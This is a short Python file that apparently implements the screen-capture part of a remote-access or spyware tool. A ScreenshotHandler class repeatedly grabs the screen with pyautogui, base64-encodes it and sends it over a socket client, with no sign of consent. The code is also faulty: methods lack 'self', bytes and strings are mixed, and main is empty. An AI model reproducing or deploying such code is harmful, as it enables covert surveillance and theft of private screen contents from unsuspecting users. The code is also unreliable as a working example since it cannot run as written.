# CODE BY AyPle

import pyautogui
import base64
import time

class ScreenshotHandler(object):
    def __init__(self, cli_obj):
        self.cli = cli_obj
        while True:
            data = take_screenshot()
            send_screenshot(data)
            # why is it 10? just for testing. I don't want to overload a pc with
            # hundreds of screenshots a second.
            time.sleep(10)

    def take_screenshot() -> bytes:
        s = pyautogui.screenshot()
        data = base64.urlsafe_b64encode(s.tobytes())
        return data

    def send_screenshot(self, data) -> int:
        try:
            self.cli.sendall(f"Screenshot {data}")
            return 1
        except:
            return 0
def main():
    pass
    
if __name__ == '__main__':
    main()
